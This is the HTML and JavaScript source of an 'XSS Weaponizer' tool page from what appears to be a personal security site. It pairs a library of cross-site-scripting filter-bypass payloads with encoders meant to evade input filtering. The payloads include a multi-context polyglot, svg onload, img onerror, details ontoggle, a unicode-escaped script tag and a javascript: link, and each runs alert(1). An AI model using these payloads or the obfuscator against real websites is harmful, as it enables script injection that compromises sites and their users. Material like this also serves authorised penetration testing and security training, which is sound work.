<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>XSS Weaponizer | dmichos</title>
    <link rel="stylesheet" href="../css/styles.css">
    <script src="https://cdn.jsdelivr.net/npm/particles.js"></script>
    <style>
        .tool-layout {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 2rem;
            margin-top: 2rem;
        }

        .box {
            background: var(--glass-bg);
            border: 1px solid var(--border-color);
            padding: 1.5rem;
        }

        textarea {
            width: 100%;
            height: 200px;
            background: rgba(255, 255, 255, 0.05);
            border: 1px solid #444;
            color: white;
            padding: 1rem;
            font-family: 'JetBrains Mono', monospace;
            outline: none;
            resize: none;
        }

        textarea:focus {
            border-color: var(--accent-primary);
        }

        .payload-list {
            max-height: 400px;
            overflow-y: auto;
        }

        .payload-item {
            background: rgba(0, 0, 0, 0.3);
            border: 1px solid #333;
            padding: 10px;
            margin-bottom: 10px;
            cursor: pointer;
            transition: 0.3s;
        }

        .payload-item:hover {
            border-color: var(--accent-secondary);
            background: rgba(0, 229, 255, 0.05);
        }

        .payload-item h4 {
            margin: 0 0 5px 0;
            color: var(--accent-primary);
            font-size: 0.8rem;
        }

        .payload-item code {
            font-size: 0.75rem;
            color: #aaa;
            word-break: break-all;
        }

        .controls {
            display: flex;
            gap: 10px;
            margin-bottom: 1rem;
        }

        .btn {
            background: transparent;
            border: 1px solid var(--accent-secondary);
            color: var(--accent-secondary);
            padding: 5px 10px;
            cursor: pointer;
            font-size: 0.8rem;
        }

        .btn:hover {
            background: var(--accent-secondary);
            color: black;
        }

        @media (max-width: 900px) {
            .tool-layout {
                grid-template-columns: 1fr;
            }
        }
    </style>
</head>

<body>
    <div id="particles-js"></div>
    <header>
        <nav>
            <ul>
                <li><a href="../index.html">/home</a></li>
                <li><a href="../about.html">/profile</a></li>
                <li><a href="../projects.html">/toolshed</a></li>
                <li><a href="../academy.html">/academy</a></li>
                <li><a href="../contact.html">/connect</a></li>
            </ul>
        </nav>
    </header>
    <main>
        <div class="terminal-window">
            <div class="terminal-header">
                <div class="dot red"></div>
                <div class="dot yellow"></div>
                <div class="dot green"></div>
                <span
                    style="font-size: 0.7rem; color: #555; margin-left: 10px;">dmichos@CyberSec:~/toolshed/xss-weaponizer</span>
            </div>
            <h1>[ XSS_POLYGLOT_&_OBFUSCATOR ]</h1>

            <div class="tool-layout">
                <!-- Generator/Obfuscator -->
                <div class="box">
                    <h3>Payload Obfuscator</h3>
                    <div class="controls">
                        <button class="btn" onclick="obfuscate('url')">URL Encode</button>
                        <button class="btn" onclick="obfuscate('html')">HTML Entity</button>
                        <button class="btn" onclick="obfuscate('hex')">Hex Encode</button>
                        <button class="btn" onclick="reset()">Clear</button>
                    </div>
                    <textarea id="weapon-input" placeholder="Enter payload to obfuscate..."></textarea>
                    <h4 style="margin-top: 1rem; color: var(--accent-secondary);">Output:</h4>
                    <textarea id="weapon-output" readonly
                        style="height: 100px; color: var(--accent-primary);"></textarea>
                </div>

                <!-- Library -->
                <div class="box">
                    <h3>Polyglot & Bypass Library</h3>
                    <div class="payload-list" id="library-list">
                        <!-- Payloads will be rendered here by JS -->
                    </div>
                </div>
            </div>
        </div>
    </main>

    <script>
        const input = document.getElementById('weapon-input');
        const output = document.getElementById('weapon-output');
        const libraryList = document.getElementById('library-list');

        const payloads = [
            {
                name: "The Ultimate Polyglot",
                code: `javascript:/*--><\/title><\/style><\/textarea><\/script></xmp><svg/onload='+/\'/+/onmouseover=1/(alert(1))//'>`
            },
            {
                name: "Simple SVG",
                code: `<svg onload=alert(1)>`
            },
            {
                name: "IMG Tag Bypass",
                code: `<img src=x onerror=alert(1)>`
            },
            {
                name: "Unicode Escape",
                code: `\\u003cscript\\u003ealert(1)\\u003c/script\\u003e`
            },
            {
                name: "HTML5 Details",
                code: `<details open ontoggle=alert(1)>`
            },
            {
                name: "Hidden Protocol",
                code: `<a href="javascript:alert(1)">Click</a>`
            }
        ];

        function renderLibrary() {
            libraryList.innerHTML = '';
            payloads.forEach((p, index) => {
                const div = document.createElement('div');
                div.className = 'payload-item';
                div.innerHTML = `
                    <h4>${p.name}</h4>
                    <code>${p.code.replace(/</g, '&lt;').replace(/>/g, '&gt;')}</code>
                `;
                div.onclick = () => setPayload(p.code);
                libraryList.appendChild(div);
            });
        }

        function setPayload(p) {
            input.value = p;
            output.value = p;
        }

        function obfuscate(type) {
            const val = input.value;
            if (!val) return;

            let result = "";
            if (type === 'url') {
                result = encodeURIComponent(val);
            } else if (type === 'html') {
                result = val.split('').map(c => `&#${c.charCodeAt(0)};`).join('');
            } else if (type === 'hex') {
                result = val.split('').map(c => `\\x${c.charCodeAt(0).toString(16).padStart(2, '0')}`).join('');
            }
            output.value = result;
        }

        function reset() {
            input.value = "";
            output.value = "";
        }

        renderLibrary();
    </script>
    <script src="../js/scripts.js"></script>
</body>

</html>
